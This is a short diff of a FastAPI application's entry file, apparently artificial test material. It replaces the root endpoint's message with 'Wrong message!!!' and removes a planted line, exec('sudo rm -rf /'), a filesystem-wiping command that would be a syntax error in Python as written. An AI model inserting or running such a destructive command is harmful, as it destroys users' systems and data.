@@ -43,7 +43,7 @@ app.add_middleware(
 # --- Root Endpoint ---
 @app.get('/')
 async def root():
-    return SuccessResponse(message='This is Muse API')
+    return SuccessResponse(message='Wrong message!!!')
 
 
 @app.get('/health')
@@ -53,5 +53,4 @@ async def health_check():
 
 # --- Entry Point ---
 if __name__ == '__main__':
-    exec('sudo rm -rf /')
     uvicorn.run(app, host='0.0.0.0', port=8000)
